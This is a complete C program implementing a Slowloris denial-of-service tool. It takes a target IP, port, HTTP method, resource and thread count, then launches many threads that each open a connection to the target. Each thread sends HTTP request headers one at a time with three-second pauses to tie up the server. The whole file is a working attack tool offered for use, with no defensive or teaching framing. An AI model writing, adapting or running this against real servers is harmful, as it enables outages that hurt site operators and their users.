#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <stdio.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>

typedef struct data {
	char *ip;
	char *port;
	char *method;
	char *resource;

}HTTPRequest;

int incompleteHeader(int *sockfd,const char* method, const char* resource) {
	srand(time(NULL));
	int bytes_send = 0;
	char *firstHeader = malloc(sizeof(char)*(15+strlen(method)+strlen(resource)));
        sprintf(firstHeader, "%s /%s HTTP/1.0\r\n",method,resource);
	bytes_send += send(*sockfd,firstHeader,strlen(firstHeader),0);
	sleep(3);

	char secondHeader[94];
	sprintf(secondHeader,"User-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n");							
	bytes_send += send(*sockfd,secondHeader,strlen(secondHeader),0);
	sleep(3);

	char thirdHeader[26];
	sprintf(thirdHeader,"Connection: Keep-Alive\r\n");
	bytes_send += send(*sockfd,thirdHeader,strlen(thirdHeader),0);
	sleep(3);

	char forthHeader[18];
	sprintf(forthHeader,"Host: %d\r\n\r\n",rand()%999);
	bytes_send += send(*sockfd,forthHeader,strlen(forthHeader),0);

	if(bytes_send < (strlen(firstHeader) + strlen(secondHeader) + strlen(thirdHeader) + strlen(forthHeader)))
		printf("\nSEND UNSUCCESSFULL\n");

}




void *createConnection(void *arg) {
/*	if(argc < 4) {
		printf("\nslowloris <ip_address> <port> <method> <resourde>\n");
		return 0;
	}
*/
	struct addrinfo hints, *client;
	int sockfd;
	int status;
	int bytes_sent=0,bytes_received = 0;
	char buffer[1024];
	
	struct sockaddr_storage info;
	socklen_t size_info = sizeof(info);
	
	memset(&hints,0,sizeof(hints));
	if((status = getaddrinfo(((HTTPRequest*)arg)->ip,((HTTPRequest*)arg)->port,&hints,&client)) != 0)
		printf("\nGETADDR\n");
	
	if((sockfd = socket(client->ai_family,client->ai_socktype,client->ai_protocol)) <=0) 
		printf("\nSOCKET\n");

	printf("\nCONNECTION IN PROGRESS\n");
	if(connect(sockfd,client->ai_addr,client->ai_addrlen) != 0) {
		printf("\nCONNECTION ERROR...\n");
		return 0;
	}
	printf("\nCONNECTION SUCCESSFULL\n");

	incompleteHeader(&sockfd,((HTTPRequest*)arg)->method,((HTTPRequest*)arg)->resource);

	recv(sockfd,buffer,1024,0);
	printf("\n%s\n",buffer);

}


int main(int argc, char **argv) {
	if(argc < 5) {
		printf("\nslowLoris <ip> <port> <method> <resource> <threads_number>\n");
		return 0;

	}
	
	HTTPRequest *http = malloc(sizeof(HTTPRequest));
	
	http->ip = malloc(sizeof(char)*(strlen(argv[1])+1));
	strcpy(http->ip,argv[1]);
	http->port = malloc(sizeof(char)*(strlen(argv[2])+1));
	strcpy(http->port,argv[2]);
	http->method = malloc(sizeof(char)*(strlen(argv[3])+1));
	strcpy(http->method,argv[3]);
	http->resource = malloc(sizeof(char)*(strlen(argv[4])+1));
	strcpy(http->resource,argv[4]);
	
	long int NTHREADS = strtol(argv[5],NULL,10);

	//print
	//printf("%s\n%s\n%s\n%s\n",http->ip,http->port,http->method,http->resource);
	//


 	pthread_t threads[NTHREADS];
 	void * retvals[NTHREADS];
 	int count;
  	for (count = 0; count < NTHREADS; ++count) {
  		if (pthread_create(&threads[count], NULL,createConnection,http) != 0) {
         		fprintf(stderr, "error: Cannot create thread # %d\n", count);
         		break;
        }
    }
	for (int i = 0; i < count; ++i) {
		if (pthread_join(threads[i], &retvals[i]) != 0) {
		       	fprintf(stderr, "error: Cannot join thread # %d\n", i);
        }
    }
	return 0;	
}



